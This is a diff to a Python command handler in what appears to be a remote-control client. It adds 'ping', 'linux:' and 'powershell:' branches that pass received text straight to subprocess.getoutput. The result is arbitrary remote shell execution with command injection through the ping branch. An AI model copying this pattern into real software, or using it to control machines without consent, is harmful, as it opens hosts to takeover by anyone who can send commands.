@@ -6,6 +6,7 @@ import psutil
 
 def cmd(cmd):
     try:
+        msg = cmd.split(' ')[0]
         if cmd.lower() == 'os':
             x = sys.platform
             if x == 'win32':
@@ -28,6 +29,13 @@ def cmd(cmd):
         if cmd.lower() == 'name':
             x = socket.gethostname()
             return x
+        if msg.lower() == 'ping':
+            x = subprocess.getoutput(cmd)
+            return x
+        if cmd.lower() == 'python --version':
+            x = str(subprocess.check_output('python --version', shell=True))
+            out = x.replace('b','').replace('\\r',"").replace('\\n',"")
+            return out
         if cmd.lower() == 'help':
             return ("""CMD HELP:
     - IP
@@ -37,12 +45,38 @@ def cmd(cmd):
     - CPU
     - KILL
     - RESET
-    - DISCONNECT""")
-        if cmd[0:4].lower() == 'dos:':
-            x = cmd.split(":",1)[1]
-            out = subprocess.getoutput(x)
-            return out
-        return 'UNKNOWN COMMAND'
+    - DISCONNECT
+    - PING
+    - PYHTON --VERSION
+    - DOS:
+    - Linux:
+    - PowerShell:""")
+        try:
+            if cmd[0:4].lower() == 'dos:':
+                x = cmd.split(":",1)[1]
+                out = subprocess.getoutput(x)
+                return out
+        except:
+            return 'DOS commands are not recognized try powershell or linux'
+        try:
+            if cmd[0:6].lower() == 'linux:':
+                if sys.platform == "linux" or sys.platform == "linux2":
+                    x = cmd.split(":",1)[1]
+                    out = subprocess.getoutput(x)
+                    return out
+                else:
+                    return 'Linux commands are not recognized try DOS or PowerShell'
+
+        except:
+            return 'Error command'
+        try:
+            if cmd[0:11].lower() == 'powershell:':
+                x = cmd.split(":",1)[1]
+                out = subprocess.getoutput('PowerShell -command "' + x+'"')
+                return out
+        except:
+            return 'PowerShell commands are not recognized try DOS or Linux'
+        return f'{cmd} Invalid command'
     except:
         pass
 
